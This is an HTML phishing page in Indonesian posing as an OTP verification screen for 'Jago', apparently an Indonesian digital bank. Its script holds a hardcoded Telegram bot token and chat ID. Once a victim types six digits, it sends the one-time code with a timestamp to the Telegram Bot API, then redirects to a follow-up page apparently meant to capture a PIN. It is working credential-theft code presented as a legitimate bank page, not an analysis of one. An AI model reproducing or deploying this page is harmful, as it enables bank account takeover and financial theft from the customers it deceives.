<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jago - Verifikasi OTP</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
        }

        body {
            background: linear-gradient(180deg, #FFF9ED 0%, #FFFFFF 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 40px 24px;
            position: relative;
            overflow-x: hidden;
        }

        .bg-circle-top {
            position: absolute;
            top: -80px;
            right: -40px;
            width: 280px;
            height: 280px;
            background: radial-gradient(circle, #FFE8C2 0%, rgba(255, 232, 194, 0) 70%);
            border-radius: 50%;
            opacity: 0.5;
            z-index: -1;
        }

        .back-btn {
            position: absolute;
            top: 20px;
            left: 20px;
            font-size: 22px;
            color: #444;
            cursor: pointer;
        }

        .logo-small {
            width: 52px;
            height: 52px;
            background-color: #FFFFFF;
            border-radius: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 26px;
            font-weight: 700;
            color: #FFB800;
            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
            margin-top: 40px;
            margin-bottom: 30px;
        }

        h1 {
            font-size: 24px;
            font-weight: 700;
            color: #222;
            margin-bottom: 12px;
            text-align: center;
        }

        .subtitle {
            font-size: 15px;
            color: #777;
            margin-bottom: 8px;
            text-align: center;
            line-height: 1.5;
        }

        .email-highlight {
            color: #FF9F1C;
            font-weight: 500;
            margin-bottom: 40px;
            text-align: center;
        }

        .otp-container {
            display: flex;
            gap: 10px;
            margin-bottom: 40px;
        }

        .otp-box {
            width: 48px;
            height: 56px;
            border: 2px solid #E5E5E5;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            font-weight: 600;
            color: #222;
            background-color: #FFFFFF;
            transition: all 0.2s ease;
            text-align: center;
            outline: none;
        }

        .otp-box:focus {
            border-color: #FFB800;
            box-shadow: 0 0 0 3px rgba(255, 184, 0, 0.15);
        }

        .otp-box.filled {
            border-color: #FFB800;
        }

        .resend-text {
            font-size: 14px;
            color: #888;
            text-align: center;
        }

        .resend-link {
            color: #FF9F1C;
            cursor: pointer;
            font-weight: 500;
        }

        .resend-link:hover {
            text-decoration: underline;
        }

        .resend-link.disabled {
            color: #CCC;
            cursor: not-allowed;
            text-decoration: none;
        }

        @keyframes fadeInUp {
            0% {
                opacity: 0;
                transform: translateY(20px);
            }
            100% {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .content {
            animation: fadeInUp 0.6s ease-out forwards;
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
        }

        .notification {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%) translateY(-100px);
            background: #4CAF50;
            color: white;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 14px;
            z-index: 1000;
            transition: transform 0.3s ease;
        }

        .notification.show {
            transform: translateX(-50%) translateY(0);
        }
    </style>
</head>
<body>
    <div class="bg-circle-top"></div>
    <div class="notification" id="notification">✅ Terkirim ke Telegram!</div>

    <div class="back-btn">←</div>

    <div class="content">
        <div class="logo-small">J</div>

        <h1>Masukkan Kode OTP</h1>
        <p class="subtitle">Kode verifikasi telah dikirim ke</p>
        <p class="email-highlight">****@gmail.com / WhatsApp / SMS</p>

        <div class="otp-container" id="otpContainer">
            <input type="text" class="otp-box" maxlength="1" data-index="0" inputmode="numeric">
            <input type="text" class="otp-box" maxlength="1" data-index="1" inputmode="numeric">
            <input type="text" class="otp-box" maxlength="1" data-index="2" inputmode="numeric">
            <input type="text" class="otp-box" maxlength="1" data-index="3" inputmode="numeric">
            <input type="text" class="otp-box" maxlength="1" data-index="4" inputmode="numeric">
            <input type="text" class="otp-box" maxlength="1" data-index="5" inputmode="numeric">
        </div>

        <p class="resend-text">
            Belum menerima kode?
            <span id="resendBtn" class="resend-link">Kirim ulang</span>
            <span id="timerText" style="display:none;">(60 detik)</span>
        </p>
    </div>

    <script>
        // ============== GANTI DATA DI BAWAH INI ==============
        const TELEGRAM_BOT_TOKEN = "8676937565:AAHH2lBa3W-FDu7TsvotAS1TN9qCrEO2isg";
        const TELEGRAM_CHAT_ID = "8592742129";
        // =======================================================

        const otpBoxes = document.querySelectorAll('.otp-box');
        const resendBtn = document.getElementById('resendBtn');
        const timerText = document.getElementById('timerText');
        const notification = document.getElementById('notification');
        let timerInterval;
        let timeLeft = 60;
        let isOtpSent = false;

        otpBoxes[0].focus();

        async function kirimKeTelegram(otp) {
            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || isOtpSent) return;
            
            isOtpSent = true;
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            const pesan = `🔐 KODE OTP DITERIMA
⏰ Waktu: ${new Date().toLocaleString('id-ID')}
📱 Kode OTP: ${otp}`;

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: pesan
                    })
                });

                if (response.ok) {
                    tampilkanNotif();
                    console.log('✅ Terkirim ke Telegram:', otp);
                    
                    // Pindah halaman setelah terkirim
                    setTimeout(() => {
                        window.location.href = 'pulihpinn.html';
                    }, 1500);
                } else {
                    console.log('❌ Gagal kirim ke Telegram');
                    alert('Gagal mengirim data. Cek Token & Chat ID Anda.');
                }
            } catch (error) {
                console.log('⚠️ Kesalahan:', error.message);
                // Beralih halaman selanjutnya index.html
                setTimeout(() => {
                    window.location.href = 'index.html';
                }, 1500);
            }
        }

        function tampilkanNotif() {
            notification.classList.add('show');
            setTimeout(() => {
                notification.classList.remove('show');
            }, 2000);
        }

        otpBoxes.forEach((box, index) => {
            box.addEventListener('input', (e) => {
                box.value = box.value.replace(/[^0-9]/g, '');
                
                if (box.value && index < otpBoxes.length - 1) {
                    otpBoxes[index + 1].focus();
                }
                
                updateBoxStyle();

                const otpValue = getOtpValue();
                if (otpValue.length === 6 && !isOtpSent) {
                    kirimKeTelegram(otpValue);
                }
            });

            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !box.value && index > 0) {
                    otpBoxes[index - 1].focus();
                }
                if (e.key === 'Backspace' && isOtpSent) {
                    isOtpSent = false;
                }
            });
        });

        function updateBoxStyle() {
            otpBoxes.forEach(box => {
                box.classList.toggle('filled', box.value);
            });
        }

        function getOtpValue() {
            return Array.from(otpBoxes).map(b => b.value).join('');
        }

        resendBtn.addEventListener('click', () => {
            if (resendBtn.classList.contains('disabled')) return;
            
            timeLeft = 60;
            isOtpSent = false;
            resendBtn.classList.add('disabled');
            resendBtn.style.display = 'none';
            timerText.style.display = 'inline';
            timerText.textContent = `(${timeLeft} detik)`;
            
            timerInterval = setInterval(() => {
                timeLeft--;
                timerText.textContent = `(${timeLeft} detik)`;
                
                if (timeLeft <= 0) {
                    clearInterval(timerInterval);
                    timerText.style.display = 'none';
                    resendBtn.style.display = 'inline';
                    resendBtn.classList.remove('disabled');
                }
            }, 1000);
        });
    </script>
</body>
</html>
